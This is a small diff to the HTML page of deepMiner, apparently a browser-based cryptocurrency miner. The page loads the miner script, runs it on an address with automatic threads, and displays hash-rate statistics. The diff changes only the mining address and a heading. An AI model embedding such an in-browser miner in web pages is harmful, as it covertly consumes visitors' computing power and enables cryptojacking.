@@ -13,7 +13,7 @@
 	</style>
 	<script src="//%deepMiner_domain%/lib/deepMiner.min.js"></script>
 	<script>
-		var addr = 'deepMiner_test';
+		var addr = 'deepMiner_wasm';
 		var miner = new deepMiner.Anonymous(addr, {
 			autoThreads: true
 		});
@@ -34,7 +34,7 @@
 			var totalHashes = miner.getTotalHashes();
 			var acceptedHashes = miner.getAcceptedHashes();
 			miner.setThrottle(idle);
-			document.getElementById('main').innerHTML = '<h2>deepMiner User : ' + addr +
+			document.getElementById('main').innerHTML = '<h2>User : ' + addr +
 				'</h2><table border="1"><tr><th>Speed</th><th>Hashs</th><th>Found</th><th>Verfiy</th></tr><tr><td>' +
 				parseInt(
 					hashesPerSecond) + '/s' + '</td><td>' + totalHashes + '</td><td>' + found + '</td><td>' +
